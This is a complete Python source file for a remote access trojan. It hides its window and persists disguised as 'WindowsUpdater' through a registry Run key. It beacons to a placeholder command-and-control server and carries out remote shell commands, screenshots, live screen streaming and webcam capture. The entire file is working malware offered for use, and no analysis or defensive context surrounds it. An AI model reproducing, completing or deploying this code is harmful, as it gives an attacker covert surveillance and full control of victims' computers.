#!/usr/bin/env python3
import socket
import subprocess
import os
import sys
import json
import base64
import time
import random
import ctypes
import shutil
from threading import Thread
from io import BytesIO

C2_HOST = 'YOUR_SERVER_IP'
C2_PORT = 4444

def hide():
    if os.name == 'nt':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def get_path():
    if getattr(sys, 'frozen', False):
        return sys.executable
    return __file__

def install():
    try:
        if os.name == 'nt':
            appdata = os.environ.get('APPDATA')
            install_dir = os.path.join(appdata, 'WindowsUpdater')
            os.makedirs(install_dir, exist_ok=True)
            dest = os.path.join(install_dir, 'updater.exe')
            current = get_path()
            if current != dest:
                shutil.copy(current, dest)
                import winreg as reg
                key = reg.OpenKey(reg.HKEY_CURRENT_USER, 
                    r'Software\Microsoft\Windows\CurrentVersion\Run', 0, reg.KEY_SET_VALUE)
                reg.SetValueEx(key, 'WindowsUpdater', 0, reg.REG_SZ, dest)
                reg.CloseKey(key)
                subprocess.Popen(dest, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                sys.exit(0)
    except:
        pass

def uninstall():
    try:
        s = socket.socket()
        s.connect((C2_HOST, C2_PORT))
        s.send(b'UNINSTALLED')
        s.close()
    except:
        pass
    try:
        if os.name == 'nt':
            import winreg as reg
            try:
                key = reg.OpenKey(reg.HKEY_CURRENT_USER, 
                    r'Software\Microsoft\Windows\CurrentVersion\Run', 0, reg.KEY_SET_VALUE)
                reg.DeleteValue(key, 'WindowsUpdater')
                reg.CloseKey(key)
            except:
                pass
        appdata = os.environ.get('APPDATA')
        install_dir = os.path.join(appdata, 'WindowsUpdater')
        if os.path.exists(install_dir):
            shutil.rmtree(install_dir)
        exe_path = get_path()
        bat_path = os.path.join(os.environ.get('TEMP'), 'del.bat')
        with open(bat_path, 'w') as f:
            f.write(f'@echo off\ntimeout /t 2 /nobreak >nul\ndel "{exe_path}"\ndel "%~f0"')
        subprocess.Popen(bat_path, shell=True)
    except:
        pass
    sys.exit(0)

def get_info():
    import platform
    return {
        'hostname': platform.node(),
        'user': os.getlogin(),
        'os': platform.system(),
        'arch': platform.architecture()[0]
    }

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((C2_HOST, C2_PORT))
            s.send(json.dumps(get_info()).encode())
            return s
        except:
            time.sleep(random.randint(5, 15))

def execute(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return (r.stdout + r.stderr)[:3000]
    except Exception as e:
        return str(e)

def screenshot():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        b = BytesIO()
        img.save(b, 'PNG')
        return base64.b64encode(b.getvalue()).decode()
    except:
        return "Error"

def screen_stream(s):
    try:
        from PIL import ImageGrab
        while True:
            img = ImageGrab.grab()
            b = BytesIO()
            img.save(b, 'JPEG', quality=50)
            img_b64 = base64.b64encode(b.getvalue()).decode()
            s.send(f"SCREEN:{img_b64}".encode())
            time.sleep(0.5)
    except:
        pass

def cam_capture():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        r, f = cap.read()
        if r:
            _, buf = cv2.imencode('.jpg', f)
            cap.release()
            return base64.b64encode(buf).decode()
        cap.release()
        return "No cam"
    except:
        return "Error"

def show_message(text):
    try:
        if os.name == 'nt':
            ctypes.windll.user32.MessageBoxW(0, text, "System Alert", 0x40 | 0x0)
        return "Message shown"
    except:
        return "Error"

def main():
    hide()
    install()
    while True:
        try:
            s = connect()
            streaming = False
            while True:
                data = s.recv(8192).decode()
                if not data:
                    break
                resp = ""
                if data == "UNINSTALL":
                    s.send(b"Uninstalling...")
                    s.close()
                    uninstall()
                elif data.startswith("SHELL:"):
                    resp = execute(data[6:])
                elif data == "SCREENSHOT":
                    resp = screenshot()
                elif data == "STREAM_START":
                    streaming = True
                    Thread(target=screen_stream, args=(s,), daemon=True).start()
                    resp = "Stream started"
                elif data == "CAM":
                    resp = cam_capture()
                elif data.startswith("MSGBOX:"):
                    resp = show_message(data[7:])
                else:
                    resp = "Unknown"
                if not streaming:
                    s.send(resp.encode() if isinstance(resp, str) else resp)
        except:
            time.sleep(5)

if __name__ == '__main__':
    if os.name == 'nt':
        mutex = ctypes.windll.kernel32.CreateMutexW(None, 1, "Global\\S0xRss2024")
        if ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit(0)
    main()